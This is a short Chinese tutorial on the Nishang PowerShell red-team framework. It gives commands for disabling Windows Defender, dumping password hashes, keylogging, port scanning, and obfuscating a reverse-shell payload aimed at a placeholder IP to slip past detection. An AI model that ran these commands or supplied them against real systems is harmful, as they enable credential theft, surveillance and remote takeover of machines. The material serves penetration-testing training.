0x00 前言

Nishang是一个框架以及脚本和有效负载的集合，它支持使用PowerShell进行攻击性安全、渗透测试和红队。Nishang在渗透测试的所有阶段都很有用。

项目下载地址：https://github.com/samratashok/nishang

0x02 Nishang 常用脚本
2.1 工具使用前的准备操作
（1）运行命令Get-host查看当前powershell的版本信息，可以看到windows10自带的版本是5.1（ Nishang 需要 Powershell 版本在 v3 以上才能使用）。
（2）windows10 需要关闭Windows Defender防病毒程序，才能导入nishang.psm1，否则会提示报错信息。
（3）PowerShell导入模块的时候是不允许的，默认是Restricted不允许任何脚本运行，需要修改执行策略。
powershell有六种执行策略：Unrestricted  权限最高，可以不受限制执行任意脚本Restricted  默认策略，不允许任意脚本的执行AllSigned  所有脚本必须经过签名运行RemoteSigned  本地脚本无限制，但是对来自网络的脚本必须经过签名Bypass   没有任何限制和提示Undefined  没有设置脚本的策略
运行命令Set-ExecutionPolicy Unrestricted，修改为最高权限，可以执行任意脚本。
以上三个准备工作弄好了之后，运行命令Import-Module -verbose .\nishang.psm1就可以愉快的导入Nishang模块了。
2.2 利用Nishang进行信息收集
可以看到下图在Nishang工具包的Gather文件夹中都是用于信息收集的脚本。
（1）运行命令Check-VM查看当前机器是不是虚拟机。如果返回的信息是This is a Hyper-V machine.，则说明当前机器不是虚拟机，如果返回的信息是This is a VMWare machine.，说明当前机器是虚拟机。
（2）通过运行命令Get-Information可以查看本机信息，包括网络和设备信息、启用的进程信息、用户信息、驱动接口信息等，可以对个人机器进行一波信息收集。
（3）运行命令Get-PassHashes抓取计算机密码Hash信息。
（4）在Gather文件夹下存在一个文件Keylogger.ps1用于保存用户的键盘记录，保存在C:\Users\Administrator\AppData\Local\Temp路径下的key.log文件中。
不过key.log文件中的是加密后的数据，需要使用Utility文件夹下的Parse_Keys进行解密。
（5）使用命令FireBuster ip -port -Verbose可进行端口扫描，可方便排查是否开启了445等端口。
0x03 混淆后反弹shell
可以使用混淆处理工具Invoke-O‍bfuscation对反弹shell的payload进行处理。
Invoke-Obfuscation是一个PowerShell v2.0+兼容的PowerShell命令和脚本混淆器。
导入模块及使用：
Import-Module ./Invoke-Obfuscation.psd1Invoke-Obfuscation
设置需要混淆处理的payload，本次实验使用基于TCP协议的反弹shell。
Set scriptblock "Invoke-PowerShellTcp -Reverse -IPAddress x.x.x.x -Port 9999"
将ENCODING混淆后的Payload保存成文件，然后运行文件可成功反弹shell。
